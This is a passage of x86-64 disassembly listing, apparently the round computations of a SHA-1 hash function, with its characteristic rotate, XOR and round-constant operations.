  4050a1:	48 31 c2             	xor    %rax,%rdx
  4050a4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4050a8:	48 31 c2             	xor    %rax,%rdx
  4050ab:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  4050af:	48 31 d0             	xor    %rdx,%rax
  4050b2:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4050b9:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4050c0:	48 c1 e0 05          	shl    $0x5,%rax
  4050c4:	48 89 c2             	mov    %rax,%rdx
  4050c7:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4050ce:	89 c0                	mov    %eax,%eax
  4050d0:	48 c1 e8 1b          	shr    $0x1b,%rax
  4050d4:	48 89 d1             	mov    %rdx,%rcx
  4050d7:	48 09 c1             	or     %rax,%rcx
  4050da:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4050e1:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4050e8:	48 31 d0             	xor    %rdx,%rax
  4050eb:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  4050f2:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4050f6:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4050fd:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405101:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405108:	89 c0                	mov    %eax,%eax
  40510a:	48 c1 e8 1f          	shr    $0x1f,%rax
  40510e:	48 09 c8             	or     %rcx,%rax
  405111:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  405115:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405119:	48 01 c2             	add    %rax,%rdx
  40511c:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405123:	48 01 d0             	add    %rdx,%rax
  405126:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40512c:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405133:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40513a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40513e:	48 89 c2             	mov    %rax,%rdx
  405141:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405148:	89 c0                	mov    %eax,%eax
  40514a:	48 c1 e8 02          	shr    $0x2,%rax
  40514e:	48 09 d0             	or     %rdx,%rax
  405151:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  405158:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
  40515c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  405160:	48 31 c2             	xor    %rax,%rdx
  405163:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  405167:	48 31 c2             	xor    %rax,%rdx
  40516a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40516e:	48 31 d0             	xor    %rdx,%rax
  405171:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405178:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40517f:	48 c1 e0 05          	shl    $0x5,%rax
  405183:	48 89 c2             	mov    %rax,%rdx
  405186:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40518d:	89 c0                	mov    %eax,%eax
  40518f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405193:	48 89 d1             	mov    %rdx,%rcx
  405196:	48 09 c1             	or     %rax,%rcx
  405199:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4051a0:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4051a7:	48 89 d6             	mov    %rdx,%rsi
  4051aa:	48 21 c6             	and    %rax,%rsi
  4051ad:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4051b4:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4051bb:	48 09 d0             	or     %rdx,%rax
  4051be:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  4051c5:	48 09 f0             	or     %rsi,%rax
  4051c8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4051cc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4051d3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4051d7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4051de:	89 c0                	mov    %eax,%eax
  4051e0:	48 c1 e8 1f          	shr    $0x1f,%rax
  4051e4:	48 09 c8             	or     %rcx,%rax
  4051e7:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4051eb:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4051ef:	48 01 c2             	add    %rax,%rdx
  4051f2:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4051f9:	48 01 c2             	add    %rax,%rdx
  4051fc:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405201:	48 01 d0             	add    %rdx,%rax
  405204:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  40520b:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405212:	48 c1 e0 1e          	shl    $0x1e,%rax
  405216:	48 89 c2             	mov    %rax,%rdx
  405219:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405220:	89 c0                	mov    %eax,%eax
  405222:	48 c1 e8 02          	shr    $0x2,%rax
  405226:	48 09 d0             	or     %rdx,%rax
  405229:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405230:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  405234:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405238:	48 31 c2             	xor    %rax,%rdx
  40523b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  40523f:	48 31 c2             	xor    %rax,%rdx
  405242:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  405246:	48 31 d0             	xor    %rdx,%rax
  405249:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405250:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405257:	48 c1 e0 05          	shl    $0x5,%rax
  40525b:	48 89 c2             	mov    %rax,%rdx
  40525e:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405265:	89 c0                	mov    %eax,%eax
  405267:	48 c1 e8 1b          	shr    $0x1b,%rax
  40526b:	48 89 d1             	mov    %rdx,%rcx
  40526e:	48 09 c1             	or     %rax,%rcx
  405271:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405278:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  40527f:	48 89 d6             	mov    %rdx,%rsi
  405282:	48 21 c6             	and    %rax,%rsi
  405285:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40528c:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405293:	48 09 d0             	or     %rdx,%rax
  405296:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  40529d:	48 09 f0             	or     %rsi,%rax
  4052a0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4052a4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4052ab:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4052af:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4052b6:	89 c0                	mov    %eax,%eax
  4052b8:	48 c1 e8 1f          	shr    $0x1f,%rax
  4052bc:	48 09 c8             	or     %rcx,%rax
  4052bf:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  4052c3:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4052c7:	48 01 c2             	add    %rax,%rdx
  4052ca:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4052d1:	48 01 c2             	add    %rax,%rdx
  4052d4:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4052d9:	48 01 d0             	add    %rdx,%rax
  4052dc:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4052e3:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4052ea:	48 c1 e0 1e          	shl    $0x1e,%rax
  4052ee:	48 89 c2             	mov    %rax,%rdx
  4052f1:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4052f8:	89 c0                	mov    %eax,%eax
  4052fa:	48 c1 e8 02          	shr    $0x2,%rax
  4052fe:	48 09 d0             	or     %rdx,%rax
  405301:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405308:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  40530c:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405310:	48 31 c2             	xor    %rax,%rdx
  405313:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  405317:	48 31 c2             	xor    %rax,%rdx
  40531a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40531e:	48 31 d0             	xor    %rdx,%rax
  405321:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405328:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40532f:	48 c1 e0 05          	shl    $0x5,%rax
  405333:	48 89 c2             	mov    %rax,%rdx
  405336:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40533d:	89 c0                	mov    %eax,%eax
  40533f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405343:	48 89 d1             	mov    %rdx,%rcx
  405346:	48 09 c1             	or     %rax,%rcx
  405349:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405350:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  405357:	48 89 d6             	mov    %rdx,%rsi
  40535a:	48 21 c6             	and    %rax,%rsi
  40535d:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405364:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  40536b:	48 09 d0             	or     %rdx,%rax
  40536e:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  405375:	48 09 f0             	or     %rsi,%rax
  405378:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40537c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405383:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405387:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40538e:	89 c0                	mov    %eax,%eax
  405390:	48 c1 e8 1f          	shr    $0x1f,%rax
  405394:	48 09 c8             	or     %rcx,%rax
  405397:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  40539b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40539f:	48 01 c2             	add    %rax,%rdx
  4053a2:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4053a9:	48 01 c2             	add    %rax,%rdx
  4053ac:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4053b1:	48 01 d0             	add    %rdx,%rax
  4053b4:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4053bb:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4053c2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4053c6:	48 89 c2             	mov    %rax,%rdx
  4053c9:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4053d0:	89 c0                	mov    %eax,%eax
  4053d2:	48 c1 e8 02          	shr    $0x2,%rax
  4053d6:	48 09 d0             	or     %rdx,%rax
  4053d9:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4053e0:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
  4053e4:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4053e8:	48 31 c2             	xor    %rax,%rdx
  4053eb:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4053ef:	48 31 c2             	xor    %rax,%rdx
  4053f2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4053f6:	48 31 d0             	xor    %rdx,%rax
  4053f9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405400:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405407:	48 c1 e0 05          	shl    $0x5,%rax
  40540b:	48 89 c2             	mov    %rax,%rdx
  40540e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405415:	89 c0                	mov    %eax,%eax
  405417:	48 c1 e8 1b          	shr    $0x1b,%rax
  40541b:	48 89 d1             	mov    %rdx,%rcx
  40541e:	48 09 c1             	or     %rax,%rcx
  405421:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405428:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40542f:	48 89 d6             	mov    %rdx,%rsi
  405432:	48 21 c6             	and    %rax,%rsi
  405435:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40543c:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405443:	48 09 d0             	or     %rdx,%rax
  405446:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  40544d:	48 09 f0             	or     %rsi,%rax
  405450:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405454:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40545b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40545f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405466:	89 c0                	mov    %eax,%eax
  405468:	48 c1 e8 1f          	shr    $0x1f,%rax
  40546c:	48 09 c8             	or     %rcx,%rax
  40546f:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  405473:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  405477:	48 01 c2             	add    %rax,%rdx
  40547a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405481:	48 01 c2             	add    %rax,%rdx
  405484:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405489:	48 01 d0             	add    %rdx,%rax
  40548c:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405493:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40549a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40549e:	48 89 c2             	mov    %rax,%rdx
  4054a1:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4054a8:	89 c0                	mov    %eax,%eax
  4054aa:	48 c1 e8 02          	shr    $0x2,%rax
  4054ae:	48 09 d0             	or     %rdx,%rax
  4054b1:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4054b8:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  4054bc:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4054c0:	48 31 c2             	xor    %rax,%rdx
  4054c3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4054c7:	48 31 c2             	xor    %rax,%rdx
  4054ca:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4054ce:	48 31 d0             	xor    %rdx,%rax
  4054d1:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4054d8:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4054df:	48 c1 e0 05          	shl    $0x5,%rax
  4054e3:	48 89 c2             	mov    %rax,%rdx
  4054e6:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4054ed:	89 c0                	mov    %eax,%eax
  4054ef:	48 c1 e8 1b          	shr    $0x1b,%rax
  4054f3:	48 89 d1             	mov    %rdx,%rcx
  4054f6:	48 09 c1             	or     %rax,%rcx
  4054f9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405500:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  405507:	48 89 d6             	mov    %rdx,%rsi
  40550a:	48 21 c6             	and    %rax,%rsi
  40550d:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405514:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  40551b:	48 09 d0             	or     %rdx,%rax
  40551e:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  405525:	48 09 f0             	or     %rsi,%rax
  405528:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40552c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405533:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405537:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40553e:	89 c0                	mov    %eax,%eax
  405540:	48 c1 e8 1f          	shr    $0x1f,%rax
  405544:	48 09 c8             	or     %rcx,%rax
  405547:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  40554b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40554f:	48 01 c2             	add    %rax,%rdx
  405552:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405559:	48 01 c2             	add    %rax,%rdx
  40555c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405561:	48 01 d0             	add    %rdx,%rax
  405564:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40556b:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405572:	48 c1 e0 1e          	shl    $0x1e,%rax
  405576:	48 89 c2             	mov    %rax,%rdx
  405579:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405580:	89 c0                	mov    %eax,%eax
  405582:	48 c1 e8 02          	shr    $0x2,%rax
  405586:	48 09 d0             	or     %rdx,%rax
  405589:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  405590:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  405594:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  405598:	48 31 c2             	xor    %rax,%rdx
  40559b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40559f:	48 31 c2             	xor    %rax,%rdx
  4055a2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4055a6:	48 31 d0             	xor    %rdx,%rax
  4055a9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4055b0:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4055b7:	48 c1 e0 05          	shl    $0x5,%rax
  4055bb:	48 89 c2             	mov    %rax,%rdx
  4055be:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4055c5:	89 c0                	mov    %eax,%eax
  4055c7:	48 c1 e8 1b          	shr    $0x1b,%rax
  4055cb:	48 89 d1             	mov    %rdx,%rcx
  4055ce:	48 09 c1             	or     %rax,%rcx
  4055d1:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4055d8:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4055df:	48 89 d6             	mov    %rdx,%rsi
  4055e2:	48 21 c6             	and    %rax,%rsi
  4055e5:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4055ec:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  4055f3:	48 09 d0             	or     %rdx,%rax
  4055f6:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  4055fd:	48 09 f0             	or     %rsi,%rax
  405600:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405604:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40560b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40560f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405616:	89 c0                	mov    %eax,%eax
  405618:	48 c1 e8 1f          	shr    $0x1f,%rax
  40561c:	48 09 c8             	or     %rcx,%rax
  40561f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  405623:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  405627:	48 01 c2             	add    %rax,%rdx
  40562a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405631:	48 01 c2             	add    %rax,%rdx
  405634:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405639:	48 01 d0             	add    %rdx,%rax
  40563c:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405643:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40564a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40564e:	48 89 c2             	mov    %rax,%rdx
  405651:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405658:	89 c0                	mov    %eax,%eax
  40565a:	48 c1 e8 02          	shr    $0x2,%rax
  40565e:	48 09 d0             	or     %rdx,%rax
  405661:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405668:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40566c:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  405670:	48 31 c2             	xor    %rax,%rdx
  405673:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  405677:	48 31 c2             	xor    %rax,%rdx
  40567a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40567e:	48 31 d0             	xor    %rdx,%rax
  405681:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405688:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40568f:	48 c1 e0 05          	shl    $0x5,%rax
  405693:	48 89 c2             	mov    %rax,%rdx
  405696:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40569d:	89 c0                	mov    %eax,%eax
  40569f:	48 c1 e8 1b          	shr    $0x1b,%rax
  4056a3:	48 89 d1             	mov    %rdx,%rcx
  4056a6:	48 09 c1             	or     %rax,%rcx
  4056a9:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4056b0:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  4056b7:	48 89 d6             	mov    %rdx,%rsi
  4056ba:	48 21 c6             	and    %rax,%rsi
  4056bd:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4056c4:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  4056cb:	48 09 d0             	or     %rdx,%rax
  4056ce:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  4056d5:	48 09 f0             	or     %rsi,%rax
  4056d8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4056dc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4056e3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4056e7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4056ee:	89 c0                	mov    %eax,%eax
  4056f0:	48 c1 e8 1f          	shr    $0x1f,%rax
  4056f4:	48 09 c8             	or     %rcx,%rax
  4056f7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4056fb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4056ff:	48 01 c2             	add    %rax,%rdx
  405702:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405709:	48 01 c2             	add    %rax,%rdx
  40570c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405711:	48 01 d0             	add    %rdx,%rax
  405714:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  40571b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405722:	48 c1 e0 1e          	shl    $0x1e,%rax
  405726:	48 89 c2             	mov    %rax,%rdx
  405729:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405730:	89 c0                	mov    %eax,%eax
  405732:	48 c1 e8 02          	shr    $0x2,%rax
  405736:	48 09 d0             	or     %rdx,%rax
  405739:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405740:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  405744:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405748:	48 31 c2             	xor    %rax,%rdx
  40574b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40574f:	48 31 c2             	xor    %rax,%rdx
  405752:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405756:	48 31 d0             	xor    %rdx,%rax
  405759:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405760:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405767:	48 c1 e0 05          	shl    $0x5,%rax
  40576b:	48 89 c2             	mov    %rax,%rdx
  40576e:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405775:	89 c0                	mov    %eax,%eax
  405777:	48 c1 e8 1b          	shr    $0x1b,%rax
  40577b:	48 89 d1             	mov    %rdx,%rcx
  40577e:	48 09 c1             	or     %rax,%rcx
  405781:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405788:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  40578f:	48 89 d6             	mov    %rdx,%rsi
  405792:	48 21 c6             	and    %rax,%rsi
  405795:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40579c:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  4057a3:	48 09 d0             	or     %rdx,%rax
  4057a6:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  4057ad:	48 09 f0             	or     %rsi,%rax
  4057b0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4057b4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4057bb:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4057bf:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4057c6:	89 c0                	mov    %eax,%eax
  4057c8:	48 c1 e8 1f          	shr    $0x1f,%rax
  4057cc:	48 09 c8             	or     %rcx,%rax
  4057cf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4057d3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4057d7:	48 01 c2             	add    %rax,%rdx
  4057da:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4057e1:	48 01 c2             	add    %rax,%rdx
  4057e4:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4057e9:	48 01 d0             	add    %rdx,%rax
  4057ec:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4057f3:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4057fa:	48 c1 e0 1e          	shl    $0x1e,%rax
  4057fe:	48 89 c2             	mov    %rax,%rdx
  405801:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405808:	89 c0                	mov    %eax,%eax
  40580a:	48 c1 e8 02          	shr    $0x2,%rax
  40580e:	48 09 d0             	or     %rdx,%rax
  405811:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405818:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  40581c:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  405820:	48 31 c2             	xor    %rax,%rdx
  405823:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405827:	48 31 c2             	xor    %rax,%rdx
  40582a:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40582e:	48 31 d0             	xor    %rdx,%rax
  405831:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405838:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40583f:	48 c1 e0 05          	shl    $0x5,%rax
  405843:	48 89 c2             	mov    %rax,%rdx
  405846:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40584d:	89 c0                	mov    %eax,%eax
  40584f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405853:	48 89 d1             	mov    %rdx,%rcx
  405856:	48 09 c1             	or     %rax,%rcx
  405859:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405860:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405867:	48 89 d6             	mov    %rdx,%rsi
  40586a:	48 21 c6             	and    %rax,%rsi
  40586d:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405874:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40587b:	48 09 d0             	or     %rdx,%rax
  40587e:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  405885:	48 09 f0             	or     %rsi,%rax
  405888:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40588c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405893:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405897:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40589e:	89 c0                	mov    %eax,%eax
  4058a0:	48 c1 e8 1f          	shr    $0x1f,%rax
  4058a4:	48 09 c8             	or     %rcx,%rax
  4058a7:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4058ab:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4058af:	48 01 c2             	add    %rax,%rdx
  4058b2:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4058b9:	48 01 c2             	add    %rax,%rdx
  4058bc:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  4058c1:	48 01 d0             	add    %rdx,%rax
